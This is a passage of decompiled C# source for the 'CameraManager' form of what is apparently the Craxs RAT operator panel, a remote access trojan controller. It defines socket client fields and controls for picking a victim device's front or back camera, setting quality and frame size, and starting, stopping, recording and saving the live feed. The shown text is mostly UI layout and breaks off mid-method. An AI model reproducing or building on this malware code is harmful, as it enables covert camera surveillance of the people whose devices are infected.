using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Craxs_Rat.My.Resources;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class CameraManager : Form
{
	public delegate void addsizedele(object[] objs);

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CAM0")]
	private PictureBox _CAM0;

	[AccessedThroughProperty("Frames")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _Frames;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	[AccessedThroughProperty("Sbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButton _Sbtn;

	[CompilerGenerated]
	[AccessedThroughProperty("Button3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _Button3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	[AccessedThroughProperty("savetimer")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _savetimer;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startbtn")]
	[CompilerGenerated]
	private DrakeUIButton _startbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("hidetoolbtn")]
	private DrakeUIButtonIcon _hidetoolbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pinbtn")]
	private DrakeUIButtonIcon _pinbtn;

	public Client classCamera;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	private bool MouseState;

	public int FPS;

	public int FPSTMP;

	public string SizeFrame;

	public PictureBox TempImage;

	public string KEYsx;

	public string tmpFolderUSER;

	public bool boSave;

	public bool Rotateit;

	public string SelectedCamera;

	public string CamerID;

	public bool Changed;

	private int frameRate;

	private bool newphoto;

	private static readonly IntPtr HWND_TOPMOST;

	private const uint SWP_NOSIZE = 1u;

	private const uint SWP_NOMOVE = 2u;

	private const uint TOPMOST_FLAGS = 3u;

	private bool keepmeto;

	internal virtual PictureBox CAM0
	{
		[CompilerGenerated]
		get
		{
			return _CAM0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CAM0_MouseHover;
			EventHandler value3 = CAM0_MouseLeave;
			PictureBox pictureBox = _CAM0;
			if (pictureBox != null)
			{
				pictureBox.MouseHover -= value2;
				pictureBox.MouseLeave -= value3;
			}
			_CAM0 = value;
			pictureBox = _CAM0;
			if (pictureBox != null)
			{
				pictureBox.MouseHover += value2;
				pictureBox.MouseLeave += value3;
			}
		}
	}

	internal virtual Timer Frames
	{
		[CompilerGenerated]
		get
		{
			return _Frames;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Frames_Tick;
			Timer timer = _Frames;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Frames = value;
			timer = _Frames;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ClientPic")]
	internal virtual PictureBox ClientPic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbofoucs")]
	internal virtual ComboBox cmbofoucs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statustext")]
	internal virtual Label statustext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolTip1")]
	internal virtual ToolTip ToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButton Sbtn
	{
		[CompilerGenerated]
		get
		{
			return _Sbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButton2_Click;
			DrakeUIButton drakeUIButton = _Sbtn;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click -= value2;
			}
			_Sbtn = value;
			drakeUIButton = _Sbtn;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUILampLED1")]
	internal virtual DrakeUILampLED DrakeUILampLED1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal virtual DrakeUIToolTip DrakeUIToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Addpo_Click;
			DrakeUIAvatar drakeUIAvatar = _Button3;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_Button3 = value;
			drakeUIAvatar = _Button3;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar2_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar2 = value;
			drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("combotext")]
	internal virtual Label combotext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("combosizes")]
	public virtual DrakeUIComboBox combosizes
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("qultytext")]
	internal virtual Label qultytext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("comboqualty")]
	public virtual DrakeUIComboBox comboqualty
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer savetimer
	{
		[CompilerGenerated]
		get
		{
			return _savetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Savetimer_Tick;
			Timer timer = _savetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_savetimer = value;
			timer = _savetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("fpstext")]
	internal virtual Label fpstext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("combocam")]
	public virtual DrakeUIComboBox combocam
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButton startbtn
	{
		[CompilerGenerated]
		get
		{
			return _startbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButton1_Click_3;
			DrakeUIButton drakeUIButton = _startbtn;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click -= value2;
			}
			_startbtn = value;
			drakeUIButton = _startbtn;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon hidetoolbtn
	{
		[CompilerGenerated]
		get
		{
			return _hidetoolbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _hidetoolbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_hidetoolbtn = value;
			drakeUIButtonIcon = _hidetoolbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon pinbtn
	{
		[CompilerGenerated]
		get
		{
			return _pinbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_pinbtn = value;
			drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	static CameraManager()
	{
		HWND_TOPMOST = new IntPtr(-1);
	}

	public CameraManager()
	{
		base.Load += CameraManager_Load;
		base.FormClosing += CameraManager_FormClosing;
		Title = "null";
		MouseState = false;
		FPS = 0;
		FPSTMP = 0;
		SizeFrame = "0 kb";
		TempImage = null;
		KEYsx = "None";
		tmpFolderUSER = "";
		boSave = false;
		Rotateit = false;
		SelectedCamera = "";
		CamerID = "null";
		Changed = false;
		frameRate = 25;
		newphoto = false;
		keepmeto = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.CAM0 = new System.Windows.Forms.PictureBox();
		this.Frames = new System.Windows.Forms.Timer(this.components);
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.Panel1 = new System.Windows.Forms.Panel();
		this.Button3 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
		this.hidetoolbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.fpstext = new System.Windows.Forms.Label();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.statustext = new System.Windows.Forms.Label();
		this.DrakeUILampLED1 = new DrakeUI.Framework.DrakeUILampLED();
		this.Label2 = new System.Windows.Forms.Label();
		this.cmbofoucs = new System.Windows.Forms.ComboBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.combocam = new DrakeUI.Framework.DrakeUIComboBox();
		this.qultytext = new System.Windows.Forms.Label();
		this.comboqualty = new DrakeUI.Framework.DrakeUIComboBox();
		this.combotext = new System.Windows.Forms.Label();
		this.combosizes = new DrakeUI.Framework.DrakeUIComboBox();
		this.Sbtn = new DrakeUI.Framework.DrakeUIButton();
		this.startbtn = new DrakeUI.Framework.DrakeUIButton();
		this.ClientPic = new System.Windows.Forms.PictureBox();
		this.ToolTip1 = new System.Windows.Forms.ToolTip(this.components);
		this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.savetimer = new System.Windows.Forms.Timer(this.components);
		this.pinbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel3 = new System.Windows.Forms.Panel();
		((System.ComponentModel.ISupportInitialize)this.CAM0).BeginInit();
		this.Panel1.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.ClientPic).BeginInit();
		this.Panel3.SuspendLayout();
		base.SuspendLayout();
		this.CAM0.BackColor = System.Drawing.Color.Black;
		this.CAM0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.CAM0.Location = new System.Drawing.Point(0, 17);
		this.CAM0.Name = "CAM0";
		this.CAM0.Size = new System.Drawing.Size(731, 486);
		this.CAM0.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.CAM0.TabIndex = 0;
		this.CAM0.TabStop = false;
		this.Frames.Interval = 1000;
		this.TOpacity.Interval = 1;
		this.Panel1.Controls.Add(this.CAM0);
		this.Panel1.Controls.Add(this.Panel3);
		this.Panel1.Controls.Add(this.fpstext);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(786, 503);
		this.Panel1.TabIndex = 3;
		this.Button3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.Button3.AvatarSize = 30;
		this.Button3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Button3.FillColor = System.Drawing.Color.Black;
		this.Button3.Font = new System.Drawing.Font("Calibri", 12f);
		this.Button3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Button3.Location = new System.Drawing.Point(6, 451);
		this.Button3.Margin = new System.Windows.Forms.Padding(4);
		this.Button3.Name = "Button3";
		this.Button3.Size = new System.Drawing.Size(34, 28);
		this.Button3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Button3.StyleCustomMode = true;
		this.Button3.Symbol = 61469;
		this.Button3.SymbolSize = 30;
		this.Button3.TabIndex = 26;
		this.Button3.Tag = "off";
		this.Button3.Text = "DrakeUIAvatar1";
		this.DrakeUIToolTip1.SetToolTip(this.Button3, "Record");
		this.DrakeUIAvatar2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.DrakeUIAvatar2.AvatarSize = 30;
		this.DrakeUIAvatar2.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar2.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIAvatar2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar2.Location = new System.Drawing.Point(6, 415);
		this.DrakeUIAvatar2.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
		this.DrakeUIAvatar2.Size = new System.Drawing.Size(34, 28);
		this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar2.StyleCustomMode = true;
		this.DrakeUIAvatar2.Symbol = 61470;
		this.DrakeUIAvatar2.SymbolSize = 25;
		this.DrakeUIAvatar2.TabIndex = 28;
		this.DrakeUIAvatar2.Tag = "off";
		this.DrakeUIAvatar2.Text = "DrakeUIAvatar1";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar2, "Rotate");
		this.hidetoolbtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.hidetoolbtn.BackColor = System.Drawing.Color.Transparent;
		this.hidetoolbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.hidetoolbtn.FillColor = System.Drawing.Color.Transparent;
		this.hidetoolbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.hidetoolbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.hidetoolbtn.Location = new System.Drawing.Point(6, 383);
		this.hidetoolbtn.Name = "hidetoolbtn";
		this.hidetoolbtn.RectColor = System.Drawing.Color.Transparent;
		this.hidetoolbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.hidetoolbtn.Size = new System.Drawing.Size(34, 25);
		this.hidetoolbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.hidetoolbtn.Symbol = 61550;
		this.hidetoolbtn.SymbolSize = 30;
		this.hidetoolbtn.TabIndex = 2;
		this.hidetoolbtn.TagString = "s";
		this.DrakeUIToolTip1.SetToolTip(this.hidetoolbtn, "Hide/Show Tools");
		this.fpstext.BackColor = System.Drawing.Color.Transparent;
		this.fpstext.Dock = System.Windows.Forms.DockStyle.Top;
		this.fpstext.Font = new System.Drawing.Font("Calibri", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.fpstext.ForeColor = System.Drawing.Color.SkyBlue;
		this.fpstext.Location = new System.Drawing.Point(0, 0);
		this.fpstext.Name = "fpstext";
		this.fpstext.Size = new System.Drawing.Size(786, 17);
		this.fpstext.TabIndex = 1;
		this.fpstext.Text = "...";
		this.fpstext.UseMnemonic = false;
		this.Panel4.BackColor = System.Drawing.Color.Black;
		this.Panel4.Controls.Add(this.statustext);
		this.Panel4.Controls.Add(this.DrakeUILampLED1);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel4.Location = new System.Drawing.Point(0, 542);
		this.Panel4.Name = "Panel4";
		this.Panel4.Size = new System.Drawing.Size(786, 16);
		this.Panel4.TabIndex = 1;
		this.statustext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.statustext.Font = new System.Drawing.Font("Calibri", 8.7f);
		this.statustext.ForeColor = System.Drawing.Color.SkyBlue;
		this.statustext.Location = new System.Drawing.Point(0, 0);
		this.statustext.Name = "statustext";
		this.statustext.Size = new System.Drawing.Size(771, 16);
		this.statustext.TabIndex = 15;
		this.statustext.Text = "Select Camera ...";
		this.DrakeUILampLED1.Color = System.Drawing.Color.SkyBlue;
		this.DrakeUILampLED1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUILampLED1.Enabled = false;
		this.DrakeUILampLED1.Location = new System.Drawing.Point(771, 0);
		this.DrakeUILampLED1.Name = "DrakeUILampLED1";
		this.DrakeUILampLED1.Size = new System.Drawing.Size(15, 16);
		this.DrakeUILampLED1.TabIndex = 22;
		this.DrakeUILampLED1.Text = "DrakeUILampLED1";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUILampLED1, "Saving...");
		this.DrakeUILampLED1.Visible = false;
		this.Label2.AutoSize = true;
		this.Label2.BackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Label2.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Label2.ForeColor = System.Drawing.Color.FromArgb(95, 95, 250);
		this.Label2.Location = new System.Drawing.Point(426, 215);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(50, 21);
		this.Label2.TabIndex = 15;
		this.Label2.Text = "Focus";
		this.cmbofoucs.BackColor = System.Drawing.Color.Black;
		this.cmbofoucs.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbofoucs.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.cmbofoucs.ForeColor = System.Drawing.Color.SkyBlue;
		this.cmbofoucs.Items.AddRange(new object[2] { "Yes", "No" });
		this.cmbofoucs.Location = new System.Drawing.Point(337, 213);
		this.cmbofoucs.Name = "cmbofoucs";
		this.cmbofoucs.Size = new System.Drawing.Size(83, 25);
		this.cmbofoucs.TabIndex = 16;
		this.Label1.AutoSize = true;
		this.Label1.BackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Label1.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Label1.ForeColor = System.Drawing.Color.FromArgb(95, 95, 250);
		this.Label1.Location = new System.Drawing.Point(426, 176);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(57, 21);
		this.Label1.TabIndex = 14;
		this.Label1.Text = "Qualty";
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
		this.Panel2.Controls.Add(this.combocam);
		this.Panel2.Controls.Add(this.qultytext);
		this.Panel2.Controls.Add(this.comboqualty);
		this.Panel2.Controls.Add(this.combotext);
		this.Panel2.Controls.Add(this.combosizes);
		this.Panel2.Controls.Add(this.Sbtn);
		this.Panel2.Controls.Add(this.startbtn);
		this.Panel2.Controls.Add(this.Label2);
		this.Panel2.Controls.Add(this.cmbofoucs);
		this.Panel2.Controls.Add(this.Label1);
		this.Panel2.Controls.Add(this.ClientPic);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(0, 503);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(786, 39);
		this.Panel2.TabIndex = 1;
		this.combocam.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combocam.FillColor = System.Drawing.Color.Black;
		this.combocam.Font = new System.Drawing.Font("Calibri", 9f);
		this.combocam.ForeColor = System.Drawing.Color.SkyBlue;
		this.combocam.Items.AddRange(new object[2] { "Front", "Back" });
		this.combocam.Location = new System.Drawing.Point(148, 8);
		this.combocam.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.combocam.MaxDropDownItems = 25;
		this.combocam.MinimumSize = new System.Drawing.Size(63, 0);
		this.combocam.Name = "combocam";
		this.combocam.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combocam.RectColor = System.Drawing.Color.SkyBlue;
		this.combocam.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combocam.Size = new System.Drawing.Size(86, 26);
		this.combocam.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combocam.StyleCustomMode = true;
		this.combocam.TabIndex = 45;
		this.combocam.Text = "Front";
		this.combocam.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.qultytext.Font = new System.Drawing.Font("Calibri", 8.7f, System.Drawing.FontStyle.Bold);
		this.qultytext.ForeColor = System.Drawing.Color.SkyBlue;
		this.qultytext.Location = new System.Drawing.Point(461, 10);
		this.qultytext.Name = "qultytext";
		this.qultytext.Size = new System.Drawing.Size(78, 28);
		this.qultytext.TabIndex = 42;
		this.qultytext.Text = "Quality";
		this.qultytext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.comboqualty.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboqualty.FillColor = System.Drawing.Color.Black;
		this.comboqualty.Font = new System.Drawing.Font("Calibri", 9f);
		this.comboqualty.ForeColor = System.Drawing.Color.SkyBlue;
		this.comboqualty.Items.AddRange(new object[10] { "10", "20", "30", "40", "50", "60", "70", "80", "90", "100" });
		this.comboqualty.Location = new System.Drawing.Point(372, 10);
		this.comboqualty.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.comboqualty.MaxDropDownItems = 25;
		this.comboqualty.MinimumSize = new System.Drawing.Size(63, 0);
		this.comboqualty.Name = "comboqualty";
		this.comboqualty.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboqualty.RectColor = System.Drawing.Color.SkyBlue;
		this.comboqualty.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboqualty.Size = new System.Drawing.Size(82, 26);
		this.comboqualty.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboqualty.StyleCustomMode = true;
		this.comboqualty.TabIndex = 43;
		this.comboqualty.Text = "70";
		this.comboqualty.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.combotext.Font = new System.Drawing.Font("Calibri", 8.7f, System.Drawing.FontStyle.Bold);
		this.combotext.ForeColor = System.Drawing.Color.SkyBlue;
		this.combotext.Location = new System.Drawing.Point(699, 10);
		this.combotext.Name = "combotext";
		this.combotext.Size = new System.Drawing.Size(65, 26);
		this.combotext.TabIndex = 40;
		this.combotext.Text = "Size";
		this.combotext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.combosizes.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combosizes.FillColor = System.Drawing.Color.Black;
		this.combosizes.Font = new System.Drawing.Font("Calibri", 9f);
		this.combosizes.ForeColor = System.Drawing.Color.SkyBlue;
		this.combosizes.Location = new System.Drawing.Point(577, 9);
		this.combosizes.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.combosizes.MaxDropDownItems = 25;
		this.combosizes.MinimumSize = new System.Drawing.Size(63, 0);
		this.combosizes.Name = "combosizes";
		this.combosizes.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combosizes.RectColor = System.Drawing.Color.SkyBlue;
		this.combosizes.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combosizes.Size = new System.Drawing.Size(115, 26);
		this.combosizes.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combosizes.StyleCustomMode = true;
		this.combosizes.TabIndex = 41;
		this.combosizes.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Sbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Sbtn.Enabled = false;
		this.Sbtn.FillColor = System.Drawing.Color.Black;
		this.Sbtn.FillDisableColor = System.Drawing.Color.FromArgb(25, 25, 25);
		this.Sbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.Sbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.Sbtn.Location = new System.Drawing.Point(241, 6);
		this.Sbtn.Name = "Sbtn";
		this.Sbtn.Radius = 15;
		this.Sbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.Sbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.Sbtn.Size = new System.Drawing.Size(87, 28);
		this.Sbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Sbtn.TabIndex = 20;
		this.Sbtn.Text = "Stop";
		this.DrakeUIToolTip1.SetToolTip(this.Sbtn, "Stop Camera");
		this.startbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.startbtn.FillColor = System.Drawing.Color.Black;
		this.startbtn.FillDisableColor = System.Drawing.Color.FromArgb(25, 25, 25);
		this.startbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.startbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.startbtn.Location = new System.Drawing.Point(54, 6);
		this.startbtn.Name = "startbtn";
		this.startbtn.Radius = 15;
		this.startbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.startbtn.RectDisableColor = System.Drawing.Color.White;
		this.startbtn.Size = new System.Drawing.Size(87, 28);
		this.startbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.startbtn.StyleCustomMode = true;
		this.startbtn.TabIndex = 44;
		this.startbtn.Text = "Start";
		this.DrakeUIToolTip1.SetToolTip(this.startbtn, "Stop Camera");
		this.ClientPic.BackColor = System.Drawing.Color.Transparent;
		this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
		this.ClientPic.Location = new System.Drawing.Point(0, 0);
		this.ClientPic.Name = "ClientPic";
		this.ClientPic.Size = new System.Drawing.Size(48, 39);
		this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.ClientPic.TabIndex = 11;
		this.ClientPic.TabStop = false;
		this.ToolTip1.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.ToolTip1.ForeColor = System.Drawing.Color.DarkTurquoise;
		this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(54, 54, 54);
		this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(239, 239, 239);
		this.DrakeUIToolTip1.OwnerDraw = true;
		this.pinbtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.pinbtn.BackColor = System.Drawing.Color.Transparent;
		this.pinbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pinbtn.FillColor = System.Drawing.Color.Transparent;
		this.pinbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.pinbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.pinbtn.Location = new System.Drawing.Point(6, 352);
		this.pinbtn.Name = "pinbtn";
		this.pinbtn.RectColor = System.Drawing.Color.Transparent;
		this.pinbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.pinbtn.Size = new System.Drawing.Size(34, 25);
		this.pinbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pinbtn.Symbol = 61581;
		this.pinbtn.SymbolSize = 30;
		this.pinbtn.TabIndex = 29;
